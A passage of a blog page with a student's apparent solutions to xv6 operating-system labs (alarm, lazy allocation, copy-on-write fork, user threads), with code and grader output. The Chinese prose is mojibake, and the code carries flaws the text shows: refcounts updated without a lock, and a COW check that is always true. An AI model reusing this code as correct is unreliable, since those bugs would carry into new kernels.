class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  memmove(p-&gt;trapframe,p-&gt;alarm_trapframe,<span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">  p-&gt;is_alarm=<span class="number">0</span>;</span><br><span class="line">  p-&gt;trapframe-&gt;a0=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(p-&gt;alarm_total_time!=<span class="number">0</span>)&#123;</span><br><span class="line">      p-&gt;alarm_time+=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>((p-&gt;alarm_time&gt;=p-&gt;alarm_total_time)&amp;&amp;(p-&gt;is_alarm==<span class="number">0</span>))&#123;</span><br><span class="line">        memmove(p-&gt;alarm_trapframe,p-&gt;trapframe,<span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">        p-&gt;trapframe-&gt;epc=(uint64)p-&gt;alarm_handler;</span><br><span class="line">        p-&gt;alarm_handler=<span class="number">0</span>;</span><br><span class="line">        p-&gt;alarm_time=<span class="number">0</span>;</span><br><span class="line">        p-&gt;is_alarm=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 85/85</span><br></pre></td></tr></table></figure>

<h3 id="ç»“è¯­-2"><a href="#ç»“è¯­-2" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>é€šè¿‡è¿™ä¸ªå®éªŒæ›´åŠ æ·±åˆ»çš„äº†è§£äº†xv6çš„å†…æ ¸å’Œç”¨æˆ·æ€ä¹‹é—´çš„åˆ‡æ¢ï¼Œä¿®æ”¹èµ·xv6ç›¸å…³ä»£ç ä¹Ÿååˆ†é¡ºæ‰‹äº†ã€‚</p>
<h2 id="LAB5-xv6-lazy-page-allocation"><a href="#LAB5-xv6-lazy-page-allocation" class="headerlink" title="LAB5: xv6 lazy page allocation"></a>LAB5: xv6 lazy page allocation</h2><p>è¿™ä¸ªå®éªŒæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å®ç°ç®€å•çš„æƒ°æ€§åˆ†é…</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">argaddr</span><span class="params">(<span class="keyword">int</span> n, uint64 *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="keyword">char</span> *mem;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  uint64 va;</span><br><span class="line">  <span class="keyword">if</span>((walkaddr(p-&gt;pagetable,*ip)==<span class="number">0</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((PGROUNDUP(p-&gt;trapframe-&gt;sp)<span class="number">-1</span>&lt;(*ip))&amp;&amp;((*ip)&lt;p-&gt;sz))&#123;</span><br><span class="line">      mem=kalloc();</span><br><span class="line">      <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">      va=PGROUNDDOWN(*ip);</span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;mappages fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause() == <span class="number">13</span>||r_scause() == <span class="number">15</span>)&#123;</span><br><span class="line">    uint64 bad_addr=r_stval();</span><br><span class="line">    <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((bad_addr&lt;p-&gt;sz)&amp;&amp;((mem=kalloc())!=<span class="number">0</span>)&amp;&amp;(PGROUNDUP(p-&gt;trapframe-&gt;sp)<span class="number">-1</span>&lt;bad_addr))&#123;</span><br><span class="line">      uint64 va=PGROUNDDOWN(bad_addr);</span><br><span class="line">      <span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line">      <span class="keyword">if</span>(mappages(p-&gt;pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;mappages fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç»“æœ-1"><a href="#ç»“æœ-1" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><h2 id="Lab6-Copy-on-Write-Fork-for-xv6"><a href="#Lab6-Copy-on-Write-Fork-for-xv6" class="headerlink" title="Lab6: Copy-on-Write Fork for xv6"></a>Lab6: Copy-on-Write Fork for xv6</h2><p>å°±æ˜¯å®ç°forkæ—¶çš„cowæœºåˆ¶ï¼Œæˆ‘çš„æ€è·¯æ˜¯åœ¨forkçš„æ—¶å€™æ²¡æœ‰<code>w</code>æƒé™çš„ç›´æ¥ç›´æ¥å¤åˆ¶æ˜ å°„ï¼Œå¦‚æœæœ‰<code>w</code>æƒé™çš„ç¬¦çŸ¥è¿›ç¨‹çš„flagå…¨éƒ¨<code>&amp;(~PTE_W)|PTE_COW</code>,è¿™æ ·<code>PTE_COW</code>æ ‡å¿—å°±æ—¢å¯ä»¥åˆ¤æ–­æ˜¯å¦æ˜¯cowæ˜ å°„ï¼Œè¿˜å¯ä»¥æ ‡è¯†è¿™ä¸ªæ˜ å°„æ˜¯æœ‰<code>w</code>æƒé™çš„ï¼Œè¿™æ ·å°±é˜²æ­¢äº†å­è¿›ç¨‹çš„æƒé™ç®¡ç†ä¸ä¸¥æ ¼ï¼Œæ¯”å¦‚å­è¿›ç¨‹å†™ä¸å¯å†™é¡µé¢ä¹‹ç±»çš„ã€‚</p>
<p>ç”±äºæˆ‘æ²¡æœ‰ä½¿ç”¨é”ï¼Œå¤šè¿›ç¨‹çš„<code>kfree()</code>å°±ä¼šå‡ºç°é—®é¢˜hhh,ä½†æ˜¯æŠŠcowå®ç°æˆåŠŸæˆ‘å°±å¿ƒæ»¡æ„è¶³äº†ï¼Œä¸‹é¢æ˜¯ä»£ç ï¼Œä¸è¿‡ä»£ç å†™çš„å¾ˆè‡ƒè‚¿ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  <span class="comment">// printf(&quot;kfree b\n&quot;);</span></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line">  uint64 num=(uint64)pa;</span><br><span class="line">  <span class="keyword">if</span>((--cow_num[num&gt;&gt;<span class="number">12</span>])!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r-&gt;next = kmem.freelist;</span><br><span class="line">  kmem.freelist = r;</span><br><span class="line">  <span class="comment">// printf(&quot;free e\n&quot;);</span></span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r)&#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  &#125;</span><br><span class="line">  uint64 num=(uint64)r;</span><br><span class="line">  cow_num[num&gt;&gt;<span class="number">12</span>]++;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause()==<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;taps b\n&quot;);</span></span><br><span class="line"></span><br><span class="line">    uint64 write_addr=r_stval();</span><br><span class="line">    uint64 va=PGROUNDDOWN(write_addr);</span><br><span class="line">    <span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write_addr&lt;MAXVA)&#123;</span><br><span class="line">      pte=walk(p-&gt;pagetable,va,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)&#123;</span><br><span class="line">        panic(<span class="string">&quot;cow usertap pte fail&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      uint flags=PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span>(((flags|PTE_COW)!=<span class="number">0</span>)&amp;&amp;(write_addr&lt;p-&gt;sz)&amp;&amp;((mem=kalloc())!=<span class="number">0</span>))&#123;</span><br><span class="line">        uint64 pa=PTE2PA(*pte);</span><br><span class="line">        memmove(mem,(<span class="keyword">void</span> *)pa,PGSIZE);</span><br><span class="line">        flags=(flags&amp;(~PTE_COW))|PTE_W;</span><br><span class="line">        *pte=PA2PTE(mem)|flags;</span><br><span class="line">        kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      p-&gt;killed=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    copyout(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// printf(&quot;copyout b\n&quot;);</span></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(va0&lt;MAXVA)&#123;</span><br><span class="line">      pte=walk(pagetable,va0,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>(pte ==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      flags=PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">if</span>((flags&amp;PTE_COW)!=<span class="number">0</span>&amp;&amp;((mem=kalloc())!=<span class="number">0</span>))&#123;</span><br><span class="line">        uint64 pa=PTE2PA(*pte);</span><br><span class="line">        memmove(mem,(<span class="keyword">void</span> *)pa,PGSIZE);</span><br><span class="line">        flags=(flags&amp;(~PTE_COW))|PTE_W;</span><br><span class="line">        *pte=PA2PTE(mem)|flags;</span><br><span class="line">        kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">        pa0=(uint64)mem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;copyout e\n&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">uvmcopy</span><span class="params">(<span class="keyword">pagetable_t</span> old, <span class="keyword">pagetable_t</span> <span class="keyword">new</span>, uint64 sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="comment">// uint64 num;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    cow_num[(pa&gt;&gt;<span class="number">12</span>)]++;</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line">    <span class="keyword">if</span>(flags&amp;PTE_W)&#123;</span><br><span class="line">      *pte=(*pte)|PTE_COW;</span><br><span class="line">      *pte=(*pte)&amp;(~PTE_W);</span><br><span class="line">      flags=flags|PTE_COW;</span><br><span class="line">      flags=(flags&amp;(~PTE_W));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// flags = (PTE_FLAGS(*pte)&amp;(~PTE_W))|PTE_COW;</span></span><br><span class="line">    <span class="keyword">if</span>(mappages(<span class="keyword">new</span>, i, PGSIZE, (uint64)pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  err:</span></span><br><span class="line"><span class="comment">//   uvmunmap(new, 0, i / PGSIZE, 1);</span></span><br><span class="line"><span class="comment">//   return -1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç»“æœ-2"><a href="#ç»“æœ-2" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><p>æ»¡åˆ†ï¼Œå¥½æ¬¸</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/xxv6/xv6-labs-2020$ ./grade-lab-cow </span><br><span class="line">make: â€œkernel/kernelâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">== Test running cowtest == (4.9s) </span><br><span class="line">== Test   simple == </span><br><span class="line">  simple: OK </span><br><span class="line">== Test   three == </span><br><span class="line">  three: OK </span><br><span class="line">== Test   file == </span><br><span class="line">  file: OK </span><br><span class="line">== Test usertests == (107.3s) </span><br><span class="line">    (Old xv6.out.usertests failure <span class="built_in">log</span> removed)</span><br><span class="line">== Test   usertests: copyin == </span><br><span class="line">  usertests: copyin: OK </span><br><span class="line">== Test   usertests: copyout == </span><br><span class="line">  usertests: copyout: OK </span><br><span class="line">== Test   usertests: all tests == </span><br><span class="line">  usertests: all tests: OK </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 110/110</span><br></pre></td></tr></table></figure>

<h2 id="Lab7-Multithreading"><a href="#Lab7-Multithreading" class="headerlink" title="Lab7: Multithreading"></a>Lab7: Multithreading</h2><h3 id="Uthread-switching-between-threads-moderate"><a href="#Uthread-switching-between-threads-moderate" class="headerlink" title="Uthread: switching between threads (moderate)"></a>Uthread: switching between threads (moderate)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">thread_create</span><span class="params">(<span class="keyword">void</span> (*func)())</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line">  t-&gt;context.sp=(uint64)t-&gt;<span class="built_in">stack</span>+STACK_SIZE<span class="number">-1</span>;</span><br><span class="line">  t-&gt;context.ra=(uint64)func;</span><br><span class="line">  <span class="comment">// YOUR CODE HEREs</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (current_thread != next_thread) &#123;         <span class="comment">/* switch threads?  */</span></span><br><span class="line">    next_thread-&gt;state = RUNNING;</span><br><span class="line">    t = current_thread;</span><br><span class="line">    current_thread = next_thread;</span><br><span class="line">    <span class="comment">/* YOUR CODE HERE</span></span><br><span class="line"><span class="comment">     * Invoke thread_switch to switch from t to next_thread:</span></span><br><span class="line"><span class="comment">     * thread_switch(??, ??);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    thread_switch((uint64)&amp;(t-&gt;context),(uint64)&amp;(current_thread-&gt;context));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span>       <span class="built_in">stack</span>[STACK_SIZE]; <span class="comment">/* the thread&#x27;s stack */</span></span><br><span class="line">  <span class="keyword">int</span>        state;             <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">	.text</span><br><span class="line">	.globl thread_switch</span><br><span class="line">thread_switch:</span><br><span class="line">	sd ra, 0(a0)</span><br><span class="line">	sd sp, 8(a0)</span><br><span class="line">	sd s0, 16(a0)</span><br><span class="line">	sd s1, 24(a0)</span><br><span class="line">	sd s2, 32(a0)</span><br><span class="line">	sd s3, 40(a0)</span><br><span class="line">	sd s4, 48(a0)</span><br><span class="line">	sd s5, 56(a0)</span><br><span class="line">	sd s6, 64(a0)</span><br><span class="line">	sd s7, 72(a0)</span><br><span class="line">	sd s8, 80(a0)</span><br><span class="line">	sd s9, 88(a0)</span><br><span class="line">	sd s10, 96(a0)</span><br><span class="line">	sd s11, 104(a0)</span><br><span class="line"></span><br><span class="line">	ld ra, 0(a1)</span><br><span class="line">	ld sp, 8(a1)</span><br><span class="line">	ld s0, 16(a1)</span><br><span class="line">	ld s1, 24(a1)</span><br><span class="line">	ld s2, 32(a1)</span><br><span class="line">	ld s3, 40(a1)</span><br><span class="line">	ld s4, 48(a1)</span><br><span class="line">	ld s5, 56(a1)</span><br><span class="line">	ld s6, 64(a1)</span><br><span class="line">	ld s7, 72(a1)</span><br><span class="line">	ld s8, 80(a1)</span><br><span class="line">	ld s9, 88(a1)</span><br><span class="line">	ld s10, 96(a1)</span><br><span class="line">	ld s11, 104(a1)</span><br><span class="line">	ret    /* return to ra */</span><br></pre></td></tr></table></figure>

<p>åé¢ä¸¤ä¸ªå®éªŒå°±æ˜¯ç”¨æˆ·æ€çš„é”å’Œé‡Šæ”¾ï¼Œå°±ä¸æ”¾ä»£ç äº†</p>
<h3 id="ç»“æœ-3"><a href="#ç»“æœ-3" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">make: â€œkernel/kernelâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">== Test uthread == uthread: OK (0.9s) </span><br><span class="line">== Test answers-thread.txt == answers-thread.txt: OK </span><br><span class="line">== Test ph_safe == make: â€œphâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">ph_safe: OK (10.8s) </span><br><span class="line">== Test ph_fast == make: â€œphâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">ph_fast: OK (22.3s) </span><br><span class="line">== Test barrier == make: â€œbarrierâ€å·²æ˜¯æœ€æ–°ã€‚</span><br><span class="line">barrier: OK (11.1s) </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 60/60</span><br></pre></td></tr></table></figure>

